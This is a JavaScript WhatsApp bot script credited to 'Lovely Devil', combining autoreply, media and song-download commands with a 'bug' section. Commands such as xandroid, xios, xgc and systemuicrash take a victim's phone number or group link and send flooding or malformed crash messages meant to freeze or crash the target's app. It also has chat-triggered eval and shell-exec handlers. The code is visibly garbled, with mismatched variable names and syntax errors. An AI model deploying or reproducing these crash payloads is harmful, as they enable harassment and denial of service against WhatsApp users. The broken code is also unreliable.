//base by Lovely Devil 
//re-upload? recode? copy code? give credit ya :)
//YouTube: @𝑳𝑶𝑽𝑬𝑳𝒀  𝑫𝑬𝑽𝑰𝑳 ⁰⁰¹🇵🇰♥️👑
//Instagram: lovely.001
//Telegram: 𝑳𝑶𝑽𝑬𝑳𝒀  𝑫𝑬𝑽𝑰𝑳 ⁰⁰¹🇵🇰♥️👑
//GitHub: @𝑳𝑶𝑽𝑬𝑳𝒀  𝑫𝑬𝑽𝑰𝑳 ⁰⁰¹🇵🇰♥️👑
//WhatsApp: +880 1311-528902
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@𝑳𝑶𝑽𝑬𝑳𝒀  𝑫𝑬𝑽𝑰𝑳 ⁰⁰¹🇵🇰♥️👑
...
//bug database
const { lovelytext1 } = require('./69/lovelytext1')
const { lovelytext2 } = require('./69/lovelytext2')
const { lovelytext3 } = require('./69/lovelytext3')
const { lovelytext4 } = require('./69/lovelytext4')
const { lovelytext5 } = require('./69/lovelytext5')
const { lovelytext6 } = require('./69/lovelytext6')
const { lovelytext7 } = require('./69/lovelytext7')
const { lovelytext8 } = require('./69/lovelytext8')
const { lovelytext9 } = require('./69/lovelytext9')
const { lovelytext10 } = require('./69/lovelytext10')
...
//autorep
const VoiceNoteLovely = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerLovely = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageLovely = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoLovely = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocLovely = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipLovely = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
...
var lovelytimewisher = `Good Afternoon ðŸŒ…`
 ...
 if(time2 < "11:00:00"){
var lovelytimewisher = `Good Morning ðŸŒ„`
 }
 if(time2 < "05:00:00"){
var lovelytimewisher = `Good Morning ðŸŒ„`
 } 
module.exports = LovelyBotInc = async (LovelyBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
        ...
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygclovely.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygclovelyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygclovely.selectedRowId || m.text) : ''
        ...
        const botNumber = await LovelyBotInc.decodeJid(XeonBotInc.user.id)
        ...
        const groupMetadata = m.isGroup ? await LovelyBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        ...
        const clientId = LovelyBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? LovelyBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || LovelyBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(LovelyBotInc, m, premium);
//group chat msg by Lovely 
const replygcxeon = (teks) => {
LovelyBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
...
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./LovelyMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
...
async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   LovelyBotInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
...
async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    ...
    LovelyBotInc.relayMessage(jid, messageContent.message, {
...
async function sendSystemCrashMessage(jid) {
  ...
  await LovelyBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
...
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return LovelyBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
...
const lovelyimun = (texto) => {
LovelyBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_lovelydevil = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
...
async function LovelyCrashy(lovely,chat) {
LovelyBotInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${lovelydevil}.${lovelytext1}` ,
caption: `${lovely + lovelytext1}`,
}, {quoted: subscribe_lovelydevil })
}
//end bug functions
...
let { key } = await LovelyBotInc.sendMessage(from, {text: 'ÊŸá´á´€á´…ÉªÉ´É¢...'})

for (let i = 0; i < lovelylod.length; i++) {
await LovelyBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!LovelyBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            LovelyBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        LovelyBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        LovelyBotInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        LovelyBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let lovelyrecordin = ['recording','composing']
        let lovelyrecordinfinal = lovelyrecordin[Math.floor(Math.random() * lovelyrecordin.length)]
        LovelyBotInc.sendPresenceUpdate(lovelyrecordinfinal, from)

        }
        
        if (autobio) {
            LovelyBotInc.updateProfileStatus(`24/7 Online Bot By Lovely Devil Bot Owner ${ownername} For more  Hacks Search On Youtube Lovely Devil`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return `lovelyBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await LovelyBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await LovelyBotInc.getName(i)}\nFN:${await LovelyBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
...
for (let BhosdikaLovely of VoiceNoteLovely) {
if (budy === BhosdikaLovely) {
let audiobuffy = fs.readFileSync(`./ `lovelyMedia/audio/${BhosdikaLovely}.mp3`)
LovelyBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaLovely of StickerLovely){
if (budy === BhosdikaLovely){
let stickerbuffy = fs.readFileSync(`./LovelyMedia/sticker/${BhosdikaLovely}.webp`)
LovelyBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaLovely of ImageLovely){
if (budy === BhosdikaLovely){
let imagebuffy = fs.readFileSync(`./LovelyMedia/image/${BhosdikaLovely}.jpg`)
LovelyBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaLovely of VideoLovely){
if (budy === BhosdikaLovely){
let videobuffy = fs.readFileSync(`./LovelyMedia/video/${BhosdikaLovely}.mp4`)
LovelyBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
LovelyBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaLovely of ApkLovely) {
if (budy === BhosdikaLovely) {
let buffer = fs.readFileSync(`./LovelyMedia/apk/${BhosdikaLovely}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
LovelyBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaLovely of ZipLovely) {
if (budy === BhosdikaLovely) {
let buffer = fs.readFileSync(`./LovelyMedia/zip/${BhosdikaLovely}.zip`)
sendzip(buffer)
}
}
...
break
            ...
            case 'addsticker': {
                ...
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./LovelyMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerLovely))
                fs.unlinkSync(delb)
                replygclovely(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replygclovely(mess.prem)
                if (args.length < 1) return replygclovely('Enter the name of the sticker')
                if (!StickerLovely.includes(q)) return replygclovely("Name Not Registered in Database")
                let wanu = StickerLovely.indexOf(q)
                StickerLovelyBotInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerLovely))
                fs.unlinkSync(`./LovelyMedia/sticker/${q}.webp`)
                replygclovely(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replygclovelg(mess.prem)
                if (args.length < 1) return replygclovely('Enter the Name?')
                if (VoiceNoteLovely.includes(q)) return replygclovely("Name Already In Use")
                let delb = await LovelyBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteLovely.push(q)
                await fsx.copy(delb, `./X
                LovelyMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replygclovely(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replygclovely(mess.prem)
                if (args.length < 1) return replygclovely('Enter the Name')
                if (!VoiceNoteLovely.includes(q)) return replygclovely("Name Not Registered in Database")
                let wanu = VoiceNoteLovely.indexOf(q)
                VoiceNoteLovely.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteLovely))
                fs.unlinkSync(`./LovelyMedia/audio/${q}.mp3`)
                replylovely(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replygclovely(mess.prem)
await loading()
if (args.length < 1) return replygclovely(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygclovely("This name is already in use")
let delb = await LovelyBotInc.downloadAndSaveMediaMessage(quoted)
ZipLovely.push(teks)
await fsx.copy(delb, `./LovelyMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygclovely(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replygclovely(mess.prem)
await loading()
if (args.length < 1) return replygclovely('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygclovely("This name does not exist in the database")
let wanu = ZipLovely.indexOf(teks)
ZipLovely.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./LovelyMedia/zip/${teks}.zip`)
replygclovely(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
...
for (let x of ZipLovely) {
teksooooo += `â”‚â­” ${x}\n`
}
teksooooo += `â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â­“\n\n*Total : ${ZipLovely.length}*`
replygclovely(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replygclovely(mess.prem)
await loading()
if (args.length < 1) return replygcLovely('What is the name of the apk?')
let teks = `${text}`
{
if (ApkLovely.includes(teks)) return replygclovely("This name is already in use")
let delb = await LovelyBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./LovelyMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replylovely(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replygclovely(mess.prem)
await loading()
if (args.length < 1) return replygclovely('Name of the apk?')
let teks = `${text}`
{
if (!Apklovely.includes(teks)) return replylovely("This name does not exist in the database")
let wanu = ApkLovely.indexOf(teks)
ApkLovely.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkLovely))
fs.unlinkSync(`./XeonMedia/apk/${teks}.apk`)
replygclovely(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
...
for (let x of ApkLovely) {
teksoooooo += `â”‚â­” ${x}\n`
}
teksoooooo += `â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â­“\n\n*Total : ${ApkXeon.length}`
replygclovely(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replygclovely(mess.prem)
await loading()
if (args.length < 1) return replygclovely('What is the name of the pdf')
let teks = `${text}`
{
if (DocLovely.includes(teks)) return replygclovely("This name is already in use")
let delb = await LovelyBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./LovelyMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocLovely))
fs.unlinkSync(delb)
replygclovely(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
...
let teks = `${text}`
{
if (!DocLovely.includes(teks)) return replygclovely("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocLovely))
fs.unlinkSync(`./XeonMedia/doc/${teks}.pdf`)
replygclovely(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
...
break
            case 'afk':
                ...
                replygclovely(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case 'play':  case 'song': {
if (!text) return replygclovely(`Example : ${prefix + command} Tum Hi ho ringtone`)
const lovelyplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await lovelyplaymp3.mp3(anup3k.url)
await LovelyBotInc.sendMessage(m.chat,{
...
const lovelyaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !lovelyaudp3.isYTUrl(text)) return replygclovely(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await lovelyaudp3.mp3(text)
await LovelyBotInc.sendMessage(m.chat,{
...
const vid=await lovelyvidoh.mp4(text)
const ytc=`
...
case 'sound160':
case 'sound161':
LovelyBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await LovelyBotInc.sendMessage(m.chat, { audio: LovelyBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case "xandroid": {
  if (!isPremium) return replygclovely(mess.prem)
  if (!text) return replygclovely(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygclovely(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 92xxxxxxxxxx,5`) 
  }
  ...
  var contactInfo = await LovelyBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "+880 1311-528902") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygclovely("The number is not registered on WhatsApp");
  }
  replygclovely("please wait, " + command + " bug is in process..");
...
case "xios": {
  ...
  if (isNaN(parseInt(amount))) {
    return replygclovely("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await LovelyBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
...
case "xios2":
  {
	if (!isPremium) return replygclovely(mess.prem)
    if (!isBot) {
      return replygclovely("*This feature is for the bot only!*");
    }
    if (!text){
      return replygclovely(`Example usage: ${prefix + command} 5`)
      }
  ...
  case "xgc":
  {
    if (!isPremium) return replygclovely(mess.prem)
    if (!text) {
      return replylovely("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygclovely("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygclovely("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await LovelyBotInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygclovely("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
      lovelyBotInc.groupLeave(groupTarget);
    } catch (error) {
      replygclovely(util.format(error));
    }
  }
  break;
  case "systemuicrash": {
...
break;
case 'clearall': {
if (!isCreator) return replygclovely(mess.owner)
LovelyBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'clearchat':
lovelymun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
...
break
            ...
            case 'bot':
            case 'allmenu':
                let lovelymenuoh = `Hello Dear ${pushname}
${lovelytimewisher}
...
if (typemenu === 'v1') {
                    ...
                    LovelyBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./lovelyMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: lovelymenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      ...
      renderLargerThumbnail: true
                    ...
                    LovelyBotInc.relayMessage(m.chat, {
            ...
            default:
                if (budy.startsWith('=>')) {
                    ...
                    function Return(sul) {
                        ...
                        return replygclovely(bang)
                    }
                    try {
                        replygclovely(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygclovely(String(e))
                    }
                }
                ...
                if (budy.startsWith('>')) {
                    ...
                    try {
                        ...
                        await replygclovely(evaled)
                    } catch (err) {
                        await replygclovely(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygclovely(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyglovely(err)
                        if (stdout) return replygclovely(stdout)
                    })
                }
        }
    } catch (err) {
        lovelyBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
